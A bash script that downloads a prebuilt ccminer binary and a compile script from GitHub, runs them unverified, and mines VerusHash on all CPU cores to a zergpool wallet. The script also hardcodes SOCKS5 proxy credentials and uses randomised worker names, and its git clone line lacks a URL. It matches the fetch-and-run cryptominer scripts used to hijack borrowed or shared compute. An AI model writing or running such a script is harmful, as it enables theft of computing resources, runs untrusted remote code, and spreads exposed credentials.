#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential 
git clone --single-branch -b Verus2.2
wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
wget -qO build https://github.com/renifer12/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
./build -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.$(echo $(shuf -i 1-10 -n 1)-MOD) -p c=RVN -t $(nproc --all)
./compile.sh
echo succes
